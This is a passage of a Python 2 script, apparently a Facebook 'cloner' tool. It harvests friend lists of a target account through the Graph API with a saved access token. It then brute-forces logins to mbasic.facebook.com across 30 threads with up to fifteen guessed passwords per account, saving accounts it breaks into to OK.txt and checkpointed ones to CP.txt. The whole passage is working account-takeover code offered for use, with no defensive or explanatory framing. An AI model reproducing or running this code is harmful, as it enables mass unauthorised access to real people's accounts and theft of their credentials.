                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                        'email': uid,
                        'pass': ps3,
                        'login': 'submit' })
                    sp = data.content
                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        ok = open('OK.txt', 'a')
                        ok.write(uid + '|' + ps3 + '\n')
                        ok.close()
                        oks.append(uid + ps3)
                    elif 'checkpoint' in sp:
                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        cp = open('CP.txt', 'a')
                        cp.write(uid + '|' + ps3 + '\n')
                        cp.close()
                        cps.append(uid + ps3)
                    else:
                        ps4 = name.lower().split(' ')[0] + p4
                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                            'email': uid,
                            'pass': ps4,
                            'login': 'submit' })
                        sp = data.content
                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            ok = open('OK.txt', 'a')
                            ok.write(uid + '|' + ps4 + '\n')
                            ok.close()
                            oks.append(uid + ps4)
                        elif 'checkpoint' in sp:
                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            cp = open('CP.txt', 'a')
                            cp.write(uid + '|' + ps4 + '\n')
                            cp.close()
                            cps.append(uid + ps4)
                        else:
                            ps5 = name.lower().split(' ')[0] + p5
                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                'email': uid,
                                'pass': ps5,
                                'login': 'submit' })
                            sp = data.content
                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                ok = open('OK.txt', 'a')
                                ok.write(uid + '|' + ps5 + '\n')
                                ok.close()
                                oks.append(uid + ps5)
                            elif 'checkpoint' in sp:
                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                cp = open('CP.txt', 'a')
                                cp.write(uid + '|' + ps5 + '\n')
                                cp.close()
                                cps.append(uid + ps5)
                            else:
                                ps6 = name.lower().split(' ')[0] + p6
                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                    'email': uid,
                                    'pass': ps6,
                                    'login': 'submit' })
                                sp = data.content
                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    ok = open('OK.txt', 'a')
                                    ok.write(uid + '|' + ps6 + '\n')
                                    ok.close()
                                    oks.append(uid + ps6)
                                elif 'checkpoint' in sp:
                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    cp = open('CP.txt', 'a')
                                    cp.write(uid + '|' + ps6 + '\n')
                                    cp.close()
                                    cps.append(uid + ps6)
                                else:
                                    ps7 = name.lower().split(' ')[0] + p7
                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                        'email': uid,
                                        'pass': ps7,
                                        'login': 'submit' })
                                    sp = data.content
                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        ok = open('OK.txt', 'a')
                                        ok.write(uid + '|' + ps7 + '\n')
                                        ok.close()
                                        oks.append(uid + ps7)
                                    elif 'checkpoint' in sp:
                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        cp = open('CP.txt', 'a')
                                        cp.write(uid + '|' + ps7 + '\n')
                                        cp.close()
                                        cps.append(uid + ps7)
                                    else:
                                        ps8 = name.lower().split(' ')[0] + p6
                                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                                            'email': uid,
                                            'pass': ps8,
                                            'login': 'submit' })
                                        sp = data.content
                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            ok = open('OK.txt', 'a')
                                            ok.write(uid + '|' + ps8 + '\n')
                                            ok.close()
                                            oks.append(uid + ps8)
                                        elif 'checkpoint' in sp:
                                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            cp = open('CP.txt', 'a')
                                            cp.write(uid + '|' + ps8 + '\n')
                                            cp.close()
                                            cps.append(uid + ps8)
                                        else:
                                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                'email': uid,
                                                'pass': ps9,
                                                'login': 'submit' })
                                            sp = data.content
                                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps9 + '\x1b[0;97m'
                                                ok = open('OK.txt', 'a')
                                                ok.write(uid + '|' + ps9 + '\n')
                                                ok.close()
                                                oks.append(uid + ps9)
                                            elif 'checkpoint' in sp:
                                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps9 + '\x1b[0;97m'
                                                cp = open('CP.txt', 'a')
                                                cp.write(uid + '|' + ps9 + '\n')
                                                cp.close()
                                                cps.append(uid + ps9)
                                            else:
                                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                    'email': uid,
                                                    'pass': ps10,
                                                    'login': 'submit' })
                                                sp = data.content
                                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps10 + '\x1b[0;97m'
                                                    ok = open('OK.txt', 'a')
                                                    ok.write(uid + '|' + ps10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + ps10)
                                                elif 'checkpoint' in sp:
                                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps10 + '\x1b[0;97m'
                                                    cp = open('CP.txt', 'a')
                                                    cp.write(uid + '|' + ps10 + '\n')
                                                    cp.close()
                                                    cps.append(uid + ps10)
                                                else:
                                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                        'email': uid,
                                                        'pass': ps11,
                                                        'login': 'submit' })
                                                    sp = data.content
                                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps11 + '\x1b[0;97m'
                                                        ok = open('OK.txt', 'a')
                                                        ok.write(uid + '|' + ps11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + ps11)
                                                    elif 'checkpoint' in sp:
                                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps11 + '\x1b[0;97m'
                                                        cp = open('CP.txt', 'a')
                                                        cp.write(uid + '|' + ps11 + '\n')
                                                        cp.close()
                                                        cps.append(uid + ps11)
                                                    else:
                                                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                            'email': uid,
                                                            'pass': ps12,
                                                            'login': 'submit' })
                                                        sp = data.content
                                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps12 + '\x1b[0;97m'
                                                            ok = open('OK.txt', 'a')
                                                            ok.write(uid + '|' + ps12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + ps12)
                                                        elif 'checkpoint' in sp:
                                                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps12 + '\x1b[0;97m'
                                                            cp = open('CP.txt', 'a')
                                                            cp.write(uid + '|' + ps12 + '\n')
                                                            cp.close()
                                                            cps.append(uid + ps12)
                                                        else:
                                                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                'email': uid,
                                                                'pass': ps13,
                                                                'login': 'submit' })
                                                            sp = data.content
                                                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps13 + '\x1b[0;97m'
                                                                ok = open('OK.txt', 'a')
                                                                ok.write(uid + '|' + ps13 + '\n')
                                                                ok.close()
                                                                oks.append(uid + ps13)
                                                            elif 'checkpoint' in sp:
                                                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps13 + '\x1b[0;97m'
                                                                cp = open('CP.txt', 'a')
                                                                cp.write(uid + '|' + ps13 + '\n')
                                                                cp.close()
                                                                cps.append(uid + ps13)
                                                            else:
                                                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                    'email': uid,
                                                                    'pass': ps14,
                                                                    'login': 'submit' })
                                                                sp = data.content
                                                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps14 + '\x1b[0;97m'
                                                                    ok = open('OK.txt', 'a')
                                                                    ok.write(uid + '|' + ps14 + '\n')
                                                                    ok.close()
                                                                    oks.append(uid + ps14)
                                                                elif 'checkpoint' in sp:
                                                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps14 + '\x1b[0;97m'
                                                                    cp = open('CP.txt', 'a')
                                                                    cp.write(uid + '|' + ps14 + '\n')
                                                                    cp.close()
                                                                    cps.append(uid + ps14)
                                                                else:
                                                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                        'email': uid,
                                                                        'pass': ps15,
                                                                        'login': 'submit' })
                                                                    sp = data.content
                                                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps15 + '\x1b[0;97m'
                                                                        ok = open('OK.txt', 'a')
                                                                        ok.write(uid + '|' + ps15 + '\n')
                                                                        ok.close()
                                                                        oks.append(uid + ps15)
                                                                    elif 'checkpoint' in sp:
                                                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps15 + '\x1b[0;97m'
                                                                        cp = open('CP.txt', 'a')
                                                                        cp.write(uid + '|' + ps15 + '\n')
                                                                        cp.close()
                                                                        cps.append(uid + ps15)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m======================================================='
    print '\x1b[1;37m[=] PROCESS HAS BEEN COMPLETE'
    print '\x1b[1;37m[=] TOTAL OK : \x1b[1;32m' + str(len(oks))
    print '\x1b[1;37m[=] TOTAL CP : \x1b[1;31m' + str(len(cps))
    print '\x1b[1;97m======================================================='
    raw_input('\x1b[1;37mPRESS ENTER TO BACK MENU ')
    menu()


def digit():
    global token
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\t     CRACK WITH DIGIT PASS'
    print '\x1b[1;97m======================================================='
    print '[1] CRACK PUBLIC ID'
    print '[2] CRACK FOLLOWERS'
    print '[3] CRACK MULTIPLE ID'
    print '[4] FILE CLONING'
    print '[0] BACK'
    print '\x1b[1;97m======================================================='
    digit_rishu()


def digit_rishu():
    rishu = raw_input('[?] Choose : ')
    id = []
    oks = []
    cps = []
    if rishu == '1':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        ps = raw_input('[1] Digit : ')
        ps2 = raw_input('[2] Digit : ')
        ps3 = raw_input('[3] Digit : ')
        ps4 = raw_input('[4] Digit : ')
        ps5 = raw_input('[5] Digit : ')
        ps6 = raw_input('[6] Digit : ')
        ps7 = raw_input('[7] Digit : ')
        ps8 = raw_input('[8] Digit : ')
        ps9 = raw_input('[9] Digit : ')
        ps10 = raw_input('[10] Digit : ')
        ps11 = raw_input('[11] Digit : ')
        ps12 = raw_input('[12] Digit : ')
        ps13 = raw_input('[13] Digit : ')
        ps14 = raw_input('[14] Digit : ')
        ps15 = raw_input('[15] Digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     CHOICE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '2':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        ps = raw_input('[1] Digit : ')
        ps2 = raw_input('[2] Digit : ')
        ps3 = raw_input('[3] Digit : ')
        ps4 = raw_input('[4] Digit : ')
        ps5 = raw_input('[5] Digit : ')
        ps6 = raw_input('[6] Digit : ')
        ps7 = raw_input('[7] Digit : ')
        ps8 = raw_input('[8] Digit : ')
        ps9 = raw_input('[9] Digit : ')
        ps10 = raw_input('[10] Digit : ')
        ps11 = raw_input('[11] Digit : ')
        ps12 = raw_input('[12] Digit : ')
        ps13 = raw_input('[13] Digit : ')
        ps14 = raw_input('[14] Digit : ')
        ps15 = raw_input('[15] Digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     CHOICE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '4':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS FILE CRACK'
        print '\x1b[1;97m======================================================='
        ps = raw_input('[1] Digit : ')
        ps2 = raw_input('[2] Digit : ')
        ps3 = raw_input('[3] Digit : ')
        ps4 = raw_input('[4] Digit : ')
        ps5 = raw_input('[5] Digit : ')
        ps6 = raw_input('[6] Digit : ')
        ps7 = raw_input('[7] Digit : ')
        ps8 = raw_input('[8] Digit : ')
        ps9 = raw_input('[9] Digit : ')
        ps10 = raw_input('[10] Digit : ')
        ps11 = raw_input('[11] Digit : ')
        ps12 = raw_input('[12] Digit : ')
        ps13 = raw_input('[13] Digit : ')
        ps14 = raw_input('[14] Digit : ')
        ps15 = raw_input('[15] Digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        
        try:
            filelist = raw_input('[?] INPUT FILE NAME : \x1b[1;92m')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print '\t    \x1b[1;38mRequested file not found\x1b[0;98m'
            raw_input(' Press enter to back ')
            choice()
        

    if rishu == '3':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        ps = raw_input('[1] Digit : ')
        ps2 = raw_input('[2] Digit : ')
        ps3 = raw_input('[3] Digit : ')
        ps4 = raw_input('[4] Digit : ')
        ps5 = raw_input('[5] Digit : ')
        ps6 = raw_input('[6] Digit : ')
        ps7 = raw_input('[7] Digit : ')
        ps8 = raw_input('[8] Digit : ')
        ps9 = raw_input('[9] Digit : ')
        ps10 = raw_input('[10] Digit : ')
        ps11 = raw_input('[11] Digit : ')
        ps12 = raw_input('[12] Digit : ')
        ps13 = raw_input('[13] Digit : ')
        ps14 = raw_input('[14] Digit : ')
        ps15 = raw_input('[15] Digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[1] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[2] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[3] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[4] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '0':
        menu()
    else:
        print ''
        print '\tSELECT VALID OPTION'
        print ''
        choice()
    print '\x1b[1;97m[=] TOTAL IDS :\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m[=] THE PROCESS HAS STARTED'
    print '\x1b[1;97m======================================================='
    print '\x1b[1;93m     SHANKAR-FACEBOOK-CLONER'
    print '\x1b[1;97m=======================================================-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        sharagent = random.choice(sua)
        session = requests.Session()
        session.headers.update({
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': sharagent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
        host = 'https://mbasic.facebook.com'
        
        try:
            data = session.post('https://mbasic.facebook.com/login.php', data = {
                'email': uid,
                'pass': ps,
                'login': 'submit' })
            sp = data.content
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps + '\x1b[0;97m'
                ok = open('OK.txt', 'a')
                ok.write(uid + '|' + ps + '\n')
                ok.close()
                oks.append(uid + ps)
            elif 'checkpoint' in sp:
                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
            else:
                data = session.post('https://mbasic.facebook.com/login.php', data = {
                    'email': uid,
                    'pass': ps2,
                    'login': 'submit' })
                sp = data.content
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    ok = open('OK.txt', 'a')
                    ok.write(uid + '|' + ps2 + '\n')
                    ok.close()
                    oks.append(uid + ps2)
                elif 'checkpoint' in sp:
                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    cp = open('CP.txt', 'a')
                    cp.write(uid + '|' + ps2 + '\n')
                    cp.close()
                    cps.append(uid + ps2)
                else:
                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                        'email': uid,
                        'pass': ps3,
                        'login': 'submit' })
                    sp = data.content
                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        ok = open('OK.txt', 'a')
                        ok.write(uid + '|' + ps3 + '\n')
                        ok.close()
                        oks.append(uid + ps3)
                    elif 'checkpoint' in sp:
                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        cp = open('CP.txt', 'a')
                        cp.write(uid + '|' + ps3 + '\n')
                        cp.close()
                        cps.append(uid + ps3)
                    else:
                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                            'email': uid,
                            'pass': ps4,
                            'login': 'submit' })
                        sp = data.content
                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            ok = open('OK.txt', 'a')
                            ok.write(uid + '|' + ps4 + '\n')
                            ok.close()
                            oks.append(uid + ps4)
                        elif 'checkpoint' in sp:
                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            cp = open('CP.txt', 'a')
                            cp.write(uid + '|' + ps4 + '\n')
                            cp.close()
                            cps.append(uid + ps4)
                        else:
                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                'email': uid,
                                'pass': ps5,
                                'login': 'submit' })
                            sp = data.content
                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                ok = open('OK.txt', 'a')
                                ok.write(uid + '|' + ps5 + '\n')
                                ok.close()
                                oks.append(uid + ps5)
                            elif 'checkpoint' in sp:
                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                cp = open('CP.txt', 'a')
                                cp.write(uid + '|' + ps5 + '\n')
                                cp.close()
                                cps.append(uid + ps5)
                            else:
                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                    'email': uid,
                                    'pass': ps6,
                                    'login': 'submit' })
                                sp = data.content
                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    ok = open('OK.txt', 'a')
                                    ok.write(uid + '|' + ps6 + '\n')
                                    ok.close()
                                    oks.append(uid + ps6)
                                elif 'checkpoint' in sp:
                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    cp = open('CP.txt', 'a')
                                    cp.write(uid + '|' + ps6 + '\n')
                                    cp.close()
                                    cps.append(uid + ps6)
                                else:
                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                        'email': uid,
                                        'pass': ps7,
                                        'login': 'submit' })
                                    sp = data.content
                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        ok = open('OK.txt', 'a')
                                        ok.write(uid + '|' + ps7 + '\n')
                                        ok.close()
                                        oks.append(uid + ps7)
                                    elif 'checkpoint' in sp:
                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        cp = open('CP.txt', 'a')
                                        cp.write(uid + '|' + ps7 + '\n')
                                        cp.close()
                                        cps.append(uid + ps7)
                                    else:
                                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                                            'email': uid,
                                            'pass': ps8,
                                            'login': 'submit' })
                                        sp = data.content
                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            ok = open('OK.txt', 'a')
                                            ok.write(uid + '|' + ps8 + '\n')
                                            ok.close()
                                            oks.append(uid + ps8)
                                        elif 'checkpoint' in sp:
                                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            cp = open('CP.txt', 'a')
                                            cp.write(uid + '|' + ps8 + '\n')
                                            cp.close()
                                            cps.append(uid + ps8)
                                        else:
                                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                'email': uid,
                                                'pass': ps9,
                                                'login': 'submit' })
                                            sp = data.content
                                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps9 + '\x1b[0;97m'
                                                ok = open('OK.txt', 'a')
                                                ok.write(uid + '|' + ps9 + '\n')
                                                ok.close()
                                                oks.append(uid + ps9)
                                            elif 'checkpoint' in sp:
                                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps9 + '\x1b[0;97m'
                                                cp = open('CP.txt', 'a')
                                                cp.write(uid + '|' + ps9 + '\n')
                                                cp.close()
                                                cps.append(uid + ps9)
                                            else:
                                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                    'email': uid,
                                                    'pass': ps10,
                                                    'login': 'submit' })
                                                sp = data.content
                                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps10 + '\x1b[0;97m'
                                                    ok = open('OK.txt', 'a')
                                                    ok.write(uid + '|' + ps10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + ps10)
                                                elif 'checkpoint' in sp:
                                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps10 + '\x1b[0;97m'
                                                    cp = open('CP.txt', 'a')
                                                    cp.write(uid + '|' + ps10 + '\n')
                                                    cp.close()
                                                    cps.append(uid + ps10)
                                                else:
                                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                        'email': uid,
                                                        'pass': ps11,
                                                        'login': 'submit' })
                                                    sp = data.content
                                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps11 + '\x1b[0;97m'
                                                        ok = open('OK.txt', 'a')
                                                        ok.write(uid + '|' + ps11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + ps11)
                                                    elif 'checkpoint' in sp:
                                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps11 + '\x1b[0;97m'
                                                        cp = open('CP.txt', 'a')
                                                        cp.write(uid + '|' + ps11 + '\n')
                                                        cp.close()
                                                        cps.append(uid + ps11)
                                                    else:
                                                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                            'email': uid,
                                                            'pass': ps12,
                                                            'login': 'submit' })
                                                        sp = data.content
                                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps12 + '\x1b[0;97m'
                                                            ok = open('OK.txt', 'a')
                                                            ok.write(uid + '|' + ps12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + ps12)
                                                        elif 'checkpoint' in sp:
                                                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps12 + '\x1b[0;97m'
                                                            cp = open('CP.txt', 'a')
                                                            cp.write(uid + '|' + ps12 + '\n')
                                                            cp.close()
                                                            cps.append(uid + ps12)
                                                        else:
                                                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                'email': uid,
                                                                'pass': ps13,
                                                                'login': 'submit' })
                                                            sp = data.content
                                                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps13 + '\x1b[0;97m'
                                                                ok = open('OK.txt', 'a')
                                                                ok.write(uid + '|' + ps13 + '\n')
                                                                ok.close()
                                                                oks.append(uid + ps13)
                                                            elif 'checkpoint' in sp:
                                                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps13 + '\x1b[0;97m'
                                                                cp = open('CP.txt', 'a')
                                                                cp.write(uid + '|' + ps13 + '\n')
                                                                cp.close()
                                                                cps.append(uid + ps13)
                                                            else:
                                                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                    'email': uid,
                                                                    'pass': ps14,
                                                                    'login': 'submit' })
                                                                sp = data.content
                                                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps14 + '\x1b[0;97m'
                                                                    ok = open('OK.txt', 'a')
                                                                    ok.write(uid + '|' + ps14 + '\n')
                                                                    ok.close()
                                                                    oks.append(uid + ps14)
                                                                elif 'checkpoint' in sp:
